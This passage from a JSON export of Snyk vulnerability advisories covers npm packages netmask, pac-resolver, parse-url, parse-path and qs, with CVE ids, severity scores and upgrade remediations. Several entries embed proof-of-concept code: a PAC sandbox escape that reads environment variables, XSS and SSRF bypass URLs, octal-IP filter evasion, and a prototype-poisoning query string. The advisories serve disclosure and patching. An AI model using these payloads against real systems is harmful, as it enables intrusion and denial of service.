                "url": "https://github.com/rs/node-netmask/commit/3f19a056c4eb808ea4a29f234274c67bc5a848f4",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md",
                "title": "PoC"
              },
              {
                "url": "https://sick.codes/universal-netmask-npm-package-used-by-270000-projects-vulnerable-to-octal-input-data-server-side-request-forgery-remote-file-inclusion-local-file-inclusion-and-more-cve-2021-28918/",
                "title": "Researcher Report"
              },
              {
                "url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-28918.yaml",
                "title": "Nuclei Templates"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-NETMASK-6056519",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[netmask](https://www.npmjs.org/package/netmask) is a library to parse IPv4 CIDR blocks.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF). It incorrectly evaluates individual IPv4 octets that contain octal strings as left-stripped integers, leading to an inordinate attack surface on hundreds of thousands of projects that rely on `netmask` to filter or evaluate IPv4 block ranges, both inbound and outbound.\r\n\r\nFor example, a remote unauthenticated attacker can request local resources using input data `0177.0.0.1` (`127.0.0.1`), which `netmask` evaluates as the public IP `177.0.0.1`.\r\nContrastingly, a remote authenticated or unauthenticated attacker can input the data `0127.0.0.01` (`87.0.0.1`) as localhost, yet the input data is a public IP and can potentially cause local and remote file inclusion (LFI/RFI).\r\nA remote authenticated or unauthenticated attacker can bypass packages that rely on `netmask` to filter IP address blocks to reach intranets, VPNs, containers, adjacent VPC instances, or LAN hosts, using input data such as `012.0.0.1` (`10.0.0.1`), which `netmask` evaluates as `12.0.0.1` (public).\n\n\n **NOTE:** This vulnerability has also been identified as: [CVE-2021-28918](https://security.snyk.io/vuln/SNYK-JS-NETMASK-1089716)\n\n## Remediation\nUpgrade `netmask` to version 2.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/rs/node-netmask/commit/3f19a056c4eb808ea4a29f234274c67bc5a848f4)\n- [PoC](https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md)\n- [Researcher Report](https://sick.codes/universal-netmask-npm-package-used-by-270000-projects-vulnerable-to-octal-input-data-server-side-request-forgery-remote-file-inclusion-local-file-inclusion-and-more-cve-2021-28918/)\n",
        "created_at": "2023-11-14T13:41:50Z",
        "updated_at": "2024-03-11T09:48:36Z",
        "problems": [
          {
            "id": "CVE-2021-29418",
            "source": "CVE"
          },
          {
            "id": "CWE-20",
            "source": "CWE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-03-29T21:32:05Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-03-30T14:57:04Z",
            "references": [
              {
                "url": "https://github.com/rs/node-netmask/commit/3f19a056c4eb808ea4a29f234274c67bc5a848f4",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/sickcodes/security/blob/master/advisories/SICK-2021-011.md",
                "title": "PoC"
              },
              {
                "url": "https://sick.codes/universal-netmask-npm-package-used-by-270000-projects-vulnerable-to-octal-input-data-server-side-request-forgery-remote-file-inclusion-local-file-inclusion-and-more-cve-2021-28918/",
                "title": "Researcher Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PACRESOLVER-1564857",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Code Execution (RCE)",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE). This can occur when used with untrusted input, due to unsafe PAC file handling.\r\n\r\nIn order to exploit this vulnerability in practice, this either requires an attacker on your local network, a specific vulnerable configuration, or some second vulnerability that allows an attacker to set your config values.\r\n\r\n**NOTE:** The fix for this vulnerability is applied in the `node-degenerator` library, a dependency is written by the same maintainer. \r\n\r\n\r\n### PoC\r\n```js\r\nconst pac = require('pac-resolver');\r\n\r\n// Should keep running forever (if not vulnerable):\r\nsetInterval(() => {\r\n    console.log(\"Still running\");\r\n}, 1000);\r\n\r\n// Parsing a malicious PAC file unexpectedly executes unsandboxed code:\r\npac(`\r\n    // Real PAC config:\r\n    function FindProxyForURL(url, host) {\r\n        return \"DIRECT\";\r\n    }\r\n\r\n    // But also run arbitrary code:\r\n    var f = this.constructor.constructor(\\`\r\n        // Running outside the sandbox:\r\n        console.log('Read env vars:', process.env);\r\n        console.log('!!! PAC file is running arbitrary code !!!');\r\n        console.log('Can read & could exfiltrate env vars ^');\r\n        console.log('Can kill parsing process, like so:');\r\n        process.exit(100); // Kill the vulnerable process\r\n        // etc etc\r\n    \\`);\r\n\r\n    f();\r\n\r\n```\n## Remediation\nUpgrade `pac-resolver` to version 5.0.0 or higher.\n## References\n- [GitHub Commit #1](https://github.com/TooTallNate/node-degenerator/commit/ccc3445354135398b6eb1a04c7d27c13b833f2d5)\n- [GitHub Commit #2](https://github.com/TooTallNate/node-degenerator/commit/9d25bb67d957bc2e5425fea7bf7a58b3fc64ff9e)\n- [Github Release](https://github.com/TooTallNate/node-pac-resolver/releases/tag/5.0.0)\n- [Researcher Blog](https://httptoolkit.tech/blog/npm-pac-proxy-agent-vulnerability/)\n",
        "created_at": "2021-08-15T12:18:11Z",
        "updated_at": "2024-03-11T09:50:25Z",
        "problems": [
          {
            "id": "CVE-2021-23406",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-05-30T13:37:37Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-08-22T13:26:31Z",
            "references": [
              {
                "url": "https://github.com/TooTallNate/node-degenerator/commit/ccc3445354135398b6eb1a04c7d27c13b833f2d5",
                "title": "GitHub Commit #1"
              },
              {
                "url": "https://github.com/TooTallNate/node-degenerator/commit/9d25bb67d957bc2e5425fea7bf7a58b3fc64ff9e",
                "title": "GitHub Commit #2"
              },
              {
                "url": "https://github.com/TooTallNate/node-pac-resolver/releases/tag/5.0.0",
                "title": "Github Release"
              },
              {
                "url": "https://httptoolkit.tech/blog/npm-pac-proxy-agent-vulnerability/",
                "title": "Researcher Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEPATH-2936439",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Authorization Bypass Through User-Controlled Key",
        "description": "## Overview\n[parse-path](https://www.npmjs.org/package/parse-path) is a Parse paths (local paths, urls: ssh/git/etc)\n\nAffected versions of this package are vulnerable to Authorization Bypass Through User-Controlled Key which is unable to detect the right resource.\n## Remediation\nUpgrade `parse-path` to version 5.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8)\n",
        "created_at": "2022-06-28T12:57:05Z",
        "updated_at": "2024-03-11T09:49:42Z",
        "problems": [
          {
            "id": "CVE-2022-0624",
            "source": "CVE"
          },
          {
            "id": "CWE-639",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-06-28T12:14:17Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-06-28T14:05:39Z",
            "references": [
              {
                "url": "https://github.com/ionicabizau/parse-path/commit/f9ad8856a3c8ae18e1cf4caef5edbabbc42840e8",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-2935944",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper sanitization of special characters for ASCII that start with `\\x` and also for all Unicodes start with `\\u`.\r\n\r\n## PoC:\r\n\r\n```js\r\nconst http = require(\"http\");\r\nconst parseUrl = require(\"parse-url\");\r\nconst url =  parseUrl('jav\\u000Dascript://%0aalert(1)');\r\nconsole.log(url)\r\nconst server = http.createServer((request, response) => {\r\n    response.writeHead(200);\r\n    if (url.scheme !== \"javascript\" && url.scheme !== null) {\r\n        response.end(\"<a href=\\'\" + url.href + \"\\'>Wowww!</a>\" );\r\n    }\r\n    else{\r\n        response.end(\"Nooo!\");\r\n    }\r\n});\r\nserver.listen(80, \"127.0.0.1\",function(){\r\n    console.log(\"http://\"+this.address().address+\":\"+this.address().port);\r\n});\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `parse-url` to version 6.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3)\n- [GitHub PR](https://github.com/IonicaBizau/parse-url/pull/37)\n",
        "created_at": "2022-06-27T11:31:35Z",
        "updated_at": "2024-03-11T09:49:42Z",
        "problems": [
          {
            "id": "CVE-2022-2217",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-06-27T11:22:52Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-06-27T15:15:24Z",
            "references": [
              {
                "url": "https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/IonicaBizau/parse-url/pull/37",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-2935947",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Information Exposure",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Information Exposure due to improper validation.\n## Remediation\nUpgrade `parse-url` to version 6.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3)\n- [GitHub PR](https://github.com/IonicaBizau/parse-url/pull/37)\n",
        "created_at": "2022-06-27T12:44:32Z",
        "updated_at": "2024-03-11T09:49:42Z",
        "problems": [
          {
            "id": "CVE-2022-0722",
            "source": "CVE"
          },
          {
            "id": "CWE-200",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 4.8,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-06-27T12:33:18Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-06-27T12:44:32Z",
            "references": [
              {
                "url": "https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/IonicaBizau/parse-url/pull/37",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-2936249",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) in the `parseUrl ` function, due to mishandling hostnames when processing usernames and passwords.\r\n\r\n## PoC:\r\n\r\n\r\n```js\r\nconst parseUrl = require(\"parse-url\");\r\nconst express = require('express');\r\nconst http = require('http');\r\nconst app = express();\r\n\r\nconst isLocal = () => (req, res, next) => (req.connection.remoteAddress === '::ffff:127.0.0.1'|| req.connection.remoteAddress === '::1' ? true:false)\r\n    ? next()\r\n    : res.json({'state':'You\\'re not locally'});\r\n\r\nparsed = parseUrl(\"http://google:com:@@127.0.0.1:9999/ssrf_check\");\r\nconsole.log(parsed);\r\n\r\napp.get('/', (req, res) => {\r\n    if(parsed.resource == '127.0.0.1'){\r\n        res.send('Not good');\r\n    } else{\r\n        http.get(parsed.href)\r\n        res.send('Good');\r\n    }\r\n});\r\n\r\napp.get('/ssrf_check', isLocal(), (req, res) =>{\r\n    console.log('ssrf bypass');\r\n    res.send(true);\r\n});\r\n\r\napp.listen(9999);\r\n```\n## Remediation\nUpgrade `parse-url` to version 6.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3)\n- [GitHub PR](https://github.com/IonicaBizau/parse-url/pull/37)\n",
        "created_at": "2022-06-28T07:23:01Z",
        "updated_at": "2024-03-11T09:49:42Z",
        "problems": [
          {
            "id": "CVE-2022-2216",
            "source": "CVE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "critical",
            "score": 9.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H/E:P"
          }
        ],
        "effective_severity_level": "critical",
        "slots": [
          {
            "disclosure_time": "2022-06-28T06:34:07Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-06-28T11:34:59Z",
            "references": [
              {
                "url": "https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/IonicaBizau/parse-url/pull/37",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-2942134",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper sanitization of special ASCII characters that start with `\\r\\r` or `\\r`.\r\nThis vulnerability exists due to an incomplete fix for [CVE-2022-2217](https://security.snyk.io/vuln/SNYK-JS-PARSEURL-2935944).\r\n\r\n## PoC:\r\n```js\r\nconst http = require(\"http\");\r\nconst parseUrl = require(\"parse-url\");\r\nconst url =  parseUrl('jav\\r\\r\\rascript://%0aalert(1)');\r\nconsole.log(url)\r\nconst server = http.createServer((request, response) => {\r\n    response.writeHead(200);\r\n    if (url.scheme !== \"javascript\" && url.scheme !== null) {\r\n        response.end(\"<a href=\\'\" + url.href + \"\\'>Wowww!</a>\" );\r\n    }\r\n    else{\r\n        response.end(\"Nooo!\");\r\n    }\r\n});\r\nserver.listen(80, \"127.0.0.1\",function(){\r\n    console.log(\"http://\"+this.address().address+\":\"+this.address().port);\r\n});\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `parse-url` to version 6.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3)\n",
        "created_at": "2022-07-06T08:19:21Z",
        "updated_at": "2024-03-11T09:49:42Z",
        "problems": [
          {
            "id": "CVE-2022-2218",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 6.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "6.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<6.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-06-28T00:01:01Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-07-06T12:25:33Z",
            "references": [
              {
                "url": "https://github.com/ionicabizau/parse-url/commit/21c72ab9412228eea753e2abc48f8962707b1fe3",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-3023021",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Server-side Request Forgery (SSRF)",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF) due to improper detection of protocol, resource, and pathname fields. Exploiting this vulnerability results in bypassing protocol verification.\r\n\r\n## PoC:\r\n\r\n```js\r\nimport parseUrl from \"parse-url\";\r\nimport fetch from 'node-fetch';\r\nvar parsed=parseUrl(\"http://nnnn@localhost:808:/?id=xss\")\r\nif(parsed.resource==\"localhost\"){\r\nconsole.log(\"internal network access is blocked\")\r\n}\r\nelse{\r\n   const response = await fetch('http://'+parsed.resource+parsed.pathname);\r\n        console.log(response)\r\n }\r\n```\n## Remediation\nUpgrade `parse-url` to version 8.1.0 or higher.\n## References\n- [GitHub Commit](https://github.com/IonicaBizau/parse-url/commit/881ecb46e39286b0c2b3c32fe61dca9377176884)\n- [GitHub PR](https://github.com/IonicaBizau/parse-url/pull/55)\n",
        "created_at": "2022-09-14T12:03:32Z",
        "updated_at": "2024-03-11T09:51:37Z",
        "problems": [
          {
            "id": "CVE-2022-2900",
            "source": "CVE"
          },
          {
            "id": "CWE-918",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 8.1.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "8.1.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<8.1.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-14T11:49:15Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-09-14T13:41:12Z",
            "references": [
              {
                "url": "https://github.com/IonicaBizau/parse-url/commit/881ecb46e39286b0c2b3c32fe61dca9377176884",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/IonicaBizau/parse-url/pull/55",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-PARSEURL-3024398",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Improper Input Validation",
        "description": "## Overview\n[parse-url](https://www.npmjs.org/package/parse-url) is an An advanced url parser supporting git urls too.\n\nAffected versions of this package are vulnerable to Improper Input Validation due to incorrect parsing of URLs. This allows the attacker to craft a malformed URL which can lead to a phishing attack.\r\n\r\n\r\n\r\n```js\r\n\r\nconst parseUrl = require(\"parse-url\");\r\nconst Url = require(\"url\");\r\n\r\nconst express = require('express');\r\nconst app = express();\r\n\r\nvar url = \"https://www.google.com:x@fakesite.com:x\";\r\nparsed = parseUrl(url);\r\nconsole.log(\"[*]`parse-url` output: \")\r\nconsole.log(parsed);\r\n\r\nparsed2 = Url.parse(url);\r\nconsole.log(\"[*]`url` output: \")\r\nconsole.log(parsed2)\r\n\r\napp.get('/', (req, res) => {\r\n    if (parsed.host == \"www.google.com\") {\r\n        res.send(\"<a href=\\'\" + parsed2.href + \"\\'>CLICK ME!</a>\")\r\n    }\r\n})\r\n\r\napp.listen(8888,\"0.0.0.0\");\r\n\r\n```\n## Remediation\nUpgrade `parse-url` to version 8.1.0 or higher.\n## References\n- [GitHub Commit](https://github.com/IonicaBizau/parse-url/commit/881ecb46e39286b0c2b3c32fe61dca9377176884)\n- [GitHub Commit](https://github.com/IonicaBizau/parse-url/commit/9500430a3b9973bb1b5b2b9b319af2685ad272b3)\n",
        "created_at": "2022-09-15T12:25:03Z",
        "updated_at": "2024-03-11T09:51:38Z",
        "problems": [
          {
            "id": "CVE-2022-3224",
            "source": "CVE"
          },
          {
            "id": "CWE-115",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 8.1.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "8.1.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<8.1.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-09-15T12:05:03Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-09-15T13:46:52Z",
            "references": [
              {
                "url": "https://github.com/IonicaBizau/parse-url/commit/881ecb46e39286b0c2b3c32fe61dca9377176884",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/IonicaBizau/parse-url/commit/9500430a3b9973bb1b5b2b9b319af2685ad272b3",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-QS-3153490",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Poisoning",
        "description": "## Overview\n[qs](https://www.npmjs.com/package/qs) is a querystring parser that supports nesting and arrays, with a depth limit.\n\nAffected versions of this package are vulnerable to Prototype Poisoning which allows attackers to cause a Node process to hang, processing an Array object whose prototype has been replaced by one with an excessive length value.\r\n\r\n**Note:** In many typical Express use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `qs` to version 6.2.4, 6.3.3, 6.4.1, 6.5.3, 6.6.1, 6.7.3, 6.8.3, 6.9.7, 6.10.3 or higher.\n## References\n- [GitHub 